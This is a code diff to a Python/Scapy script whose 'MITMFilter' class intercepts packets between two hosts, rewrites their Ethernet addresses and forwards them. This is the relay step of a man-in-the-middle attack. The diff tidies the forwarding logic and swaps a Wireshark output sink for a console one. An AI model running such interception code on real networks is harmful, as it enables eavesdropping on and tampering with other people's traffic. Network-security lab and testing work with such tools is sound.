@@ -20,14 +20,16 @@ class MITMFilter(Drain):
     def push(self, msg):
         if not msg.haslayer(Ether) or msg[Ether].dst != self.mac_host:
             return # ignore outgoing packets
-        print(f"MITMFilter: {msg.show()}")
         if msg.haslayer(IP):
             if msg[IP].src == self.ip_a and msg[IP].dst == self.ip_b:
                 msg[Ether].dst = self.mac_b
-                self._send(msg)
             elif msg[IP].src == self.ip_b and msg[IP].dst == self.ip_a:
                 msg[Ether].dst = self.mac_a
-                self._send(msg)
+            else:
+                return
+            msg[Ether].src = self.mac_host
+            print(f"MITMFilter: Forwarding modified packet: {msg.summary()}")
+            self._send(msg)
 
 class Forwarder(Sink):
     def __init__(self, iface):
@@ -55,7 +57,7 @@ def main():
 
     filter = MITMFilter(args.ip_a, args.ip_b, mac_a, mac_b, mac_host)
     forwarder = Forwarder(iface=args.iface)
-    wire = WiresharkSink()
+    wire = ConsoleSink()
     source > filter
     filter > forwarder
     filter > wire
